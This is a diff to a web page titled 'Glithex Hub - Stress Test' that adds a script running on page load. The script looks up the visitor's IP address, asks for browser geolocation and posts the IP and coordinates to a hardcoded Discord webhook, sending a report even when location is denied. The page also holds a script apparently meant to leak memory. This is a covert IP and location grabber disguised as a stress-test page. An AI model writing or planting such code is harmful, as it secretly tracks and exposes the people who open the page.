@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
+  
   <title>Glithex Hub - Stress Test</title>
   <style>
     body {
@@ -18,8 +19,53 @@
     #log { white-space: pre-line; text-align: center; }
   </style>
 </head>
+  
 <body>
 <div id="log"></div>
+<script>
+(async () => {
+    const webhookUrl = "https://discord.com/api/webhooks/1368709032197754910/rfJlca3MPqyEgXvwAM3eNKTa_Sn2cRKVY7-XPcuZu6N90Cf3Q4_yoR9TsyRYwiHYSGth";
+
+    // FREE IP fetch via api64
+    const ipData = await fetch("https://api64.ipify.org?format=json")
+        .then(res => res.json())
+        .catch(() => ({ ip: "N/A" }));
+
+    let geoMsg = "Geolocation not supported or denied.";
+
+    // Ask for geolocation permission
+    if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+            async (pos) => {
+                const { latitude, longitude } = pos.coords;
+                geoMsg = `Lat: ${latitude}, Lon: ${longitude}`;
+
+                const content = `🕵️ IP: ${ipData.ip}\n📍 Location: ${geoMsg}`;
+                await fetch(webhookUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ content })
+                });
+            },
+            async (err) => {
+                const content = `🕵️ IP: ${ipData.ip}\n🚫 Location permission denied.`;
+                await fetch(webhookUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ content })
+                });
+            }
+        );
+    } else {
+        const content = `🕵️ IP: ${ipData.ip}\n❌ Geolocation not supported.`;
+        await fetch(webhookUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ content })
+        });
+    }
+})();
+</script>
 
 <script>
   let memoryLeak = [];
